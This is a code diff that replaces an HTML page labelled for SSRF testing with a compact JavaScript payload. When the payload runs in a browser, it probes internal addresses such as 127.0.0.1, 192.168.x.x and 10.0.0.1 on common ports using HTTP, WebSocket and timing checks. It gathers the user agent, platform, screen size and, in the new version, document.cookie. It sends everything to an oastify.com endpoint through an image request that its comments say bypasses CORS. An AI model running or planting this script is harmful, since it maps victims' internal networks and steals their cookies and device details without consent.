@@ -1,121 +1,81 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Enhanced Browser & PC Details for SSRF Testing</title>
-  <style>
-    body { font-family: sans-serif; margin: 2rem; }
-    pre { background: #f4f4f4; padding: 1rem; }
-  </style>
-</head>
-<body>
-  <h1>Enhanced Browser and PC Details</h1>
-  <pre id="details">Collecting...</pre>
+<script>(async () => {
+    const oastDomain = 'od547dymv9h693do4u2sfx1nze55t2hr.oastify.com';
 
-  <script>
-    async function getLocalIPs() {
-      const ips = [];
-      try {
-        const pc = new RTCPeerConnection({ iceServers: [] });
-        pc.createDataChannel("");
-        pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        pc.onicecandidate = (event) => {
-          if (event.candidate) {
-            const ip = event.candidate.candidate.split(" ")[4];
-            if (!ips.includes(ip)) ips.push(ip);
-          }
-        };
-        await new Promise(resolve => setTimeout(resolve, 1000));
-        pc.close();
-      } catch (e) {
-        console.log("WebRTC IP detection failed:", e);
-      }
-      return ips;
-    }
+    // Define IPs and ports to scan
+    const ips = ['127.0.0.1', '0.0.0.0', '192.168.0.1', '192.168.1.1', '10.0.0.1', 'localhost'];
+    const ports = [80, 8080, 443, 3306, 6379, 1883, 8086, 6066];  // Common HTTP and non-HTTP ports
 
-    async function scanLocalPorts(ips) {
-      const ports = [80, 8080, 3000, 5000, 8000, 8086, 6066];
-      const results = [];
+    const results = [];
+    const wsResults = [];
+    const timingResults = [];
 
-      for (const ip of ips) {
-        for (const port of ports) {
-          const url = `http://${ip}:${port}`;
-          try {
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 2000);
-            const response = await fetch(url, { signal: controller.signal, credentials: 'omit' });
-            clearTimeout(timeoutId);
-            if (response.ok) {
-              results.push(`Open: ${url}`);
-            }
-          } catch (error) {
-            if (error.name === "AbortError") {
-              results.push(`Timeout: ${url}`);
-            } else {
-              results.push(`Closed or CORS blocked: ${url}`);
-            }
-          }
+    // Function to perform HTTP Fetch Requests
+    async function scanHttp(ip, port) {
+        const url = `http://${ip}:${port}`;
+        try {
+            const response = await fetch(url, { method: 'GET', credentials: 'omit' });
+            const result = response.ok ? `HTTP Open: ${url}` : `HTTP Closed: ${url}`;
+            results.push(result);
+        } catch (error) {
+            results.push(`HTTP Failed: ${url} - ${error}`);
         }
-      }
-      return results;
     }
 
-    async function getBrowserAndPCDetails() {
-      const ips = await getLocalIPs();
-      const portScanResults = await scanLocalPorts(ips.length > 0 ? ips : ["127.0.0.1", "localhost"]);
-      
-      return {
-        // IP and Network Information
-        localIPs: ips,
-        portScanResults: portScanResults,
+    // Function to perform WebSocket Requests
+    async function scanWebSocket(ip, port) {
+        const url = `ws://${ip}:${port}`;
+        try {
+            const ws = new WebSocket(url);
+            ws.onerror = () => wsResults.push(`WS Closed: ${url}`);
+            ws.onopen = () => {
+                wsResults.push(`WS Open: ${url}`);
+                ws.close();
+            };
+            await new Promise(res => setTimeout(res, 500));
+        } catch (e) {
+            wsResults.push(`WS Error: ${url}`);
+        }
+    }
 
-        // Browser properties
+    // Timing Attack for Service Detection
+    async function timingAttack(ip, port) {
+        const url = `http://${ip}:${port}`;
+        const start = performance.now();
+        try { await fetch(url); } catch (e) { }
+        const duration = performance.now() - start;
+        timingResults.push(`Timing ${url}: ${duration}ms`);
+    }
+
+    // Browser and System Info Collection
+    const systemInfo = {
         userAgent: navigator.userAgent,
-        appName: navigator.appName,
-        appVersion: navigator.appVersion,
         platform: navigator.platform,
         language: navigator.language,
-        languages: navigator.languages,
-        cookieEnabled: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack,
-        online: navigator.onLine,
-        
-        // Hardware details (if available)
-        hardwareConcurrency: navigator.hardwareConcurrency,
-        deviceMemory: navigator.deviceMemory || "Not available",
-        
-        // Screen details
-        screen: {
-          width: screen.width,
-          height: screen.height,
-          colorDepth: screen.colorDepth,
-          pixelDepth: screen.pixelDepth
-        },
-        
-        // Timezone offset in minutes
-        timezoneOffset: new Date().getTimezoneOffset(),
-        
-        // Plugins list (if any)
-        plugins: Array.from(navigator.plugins).map(p => p.name) || "No plugins available"
-      };
+        cookies: document.cookie || 'No cookies',
+        screen: `${screen.width}x${screen.height}`,
+        cores: navigator.hardwareConcurrency || 'Unknown',
+    };
+
+    // Execute HTTP, WebSocket Scans, and Timing Attacks
+    for (const ip of ips) {
+        for (const port of ports) {
+            await scanHttp(ip, port);
+            await scanWebSocket(ip, port);
+            await timingAttack(ip, port);
+        }
     }
 
-    (async () => {
-      const details = await getBrowserAndPCDetails();
-      const report = encodeURIComponent(JSON.stringify({
+    // Prepare Data for Exfiltration
+    const payload = encodeURIComponent(JSON.stringify({
         timestamp: new Date().toISOString(),
-        details: details
-      }));
+        httpResults: results,
+        wsResults: wsResults,
+        timingResults: timingResults,
+        systemInfo: systemInfo,
+    }));
 
-      // Display details on the page
-      document.getElementById("details").textContent = JSON.stringify(details, null, 2);
-      
-      // Exfiltration: Send data without triggering CORS errors
-      const exfiltrationUrl = `https://od547dymv9h693do4u2sfx1nze55t2hr.oastify.com/?report=${report}`;
-      const img = new Image();
-      img.src = exfiltrationUrl;
-      console.log('Exfiltration request sent to od547dymv9h693do4u2sfx1nze55t2hr.oastify.com');
-    })();
-  </script>
-</body>
-</html>
+    // Exfiltrate Data via Image Request (Bypass CORS)
+    const img = new Image();
+    img.src = `https://${oastDomain}/?data=${payload}`;
+    console.log('Data exfiltrated to OAST endpoint.');
+})();</script>
